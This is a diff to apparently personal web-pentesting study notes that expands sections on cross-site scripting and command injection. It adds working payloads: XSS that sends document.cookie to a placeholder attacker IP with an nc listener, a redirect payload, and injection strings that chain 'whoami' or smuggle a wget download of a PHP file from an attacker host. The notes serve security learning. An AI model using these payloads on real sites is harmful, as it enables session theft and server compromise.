@@ -892,25 +892,40 @@ sqlmap injecting in cookies:
 
 ### XXS (Cross Site Scripting)
 
+Lets us execute JavaScript in a browser.
+
 Three types:
 - Reflected
+  - Injected script is included in the response.
 - Stored
+  - More powerful
+  - Payload is stored in DB and retrieved later
 - DOM
+  - Everything happens locally
 
 Test for XXS:
 - `<script>print()</script>`
-- `<script>prompt("Hello World!")</script>`
+- `<script>prompt(1)</script>`
 
 Execute script using if the page does not reload when trying the exploit:
 - `<img src=x onerror="print()">`
 
+Forward user to a different site:
+- `<img src=x onerror="window.location.replace('[url]')">`
+
+Stored XSS:
+- Use two containers to check for stored XSS. If the command executes on the other container as well, it is stored XSS.
+
 Exfiltrating data:
-- `<script>var i= new Image; i.src="[url]/?"+document.cookie`
+- Using netcat
+  - `nc -nvlp [port]`
+  - `<script>fetch('http://[ip]:[port]/?' + document.cookie)</script>`
+- `<script>var i = new Image; i.src="http://[ip]:[port]/?"+document.cookie</script>`
 
 ### Command injection
 
 Inject bash, php, python, etc. through an input.
-- `http://tcm-sec.com ; whoami; asd`
+- `http://tcm-sec.com; whoami; asd`
 - `http://[url]/?'[command]'`
 - Host a python webserver on port `[port]`
   - `https://tcm-sec.com \n wget [attacker-ip]:[port]/[filename].php`
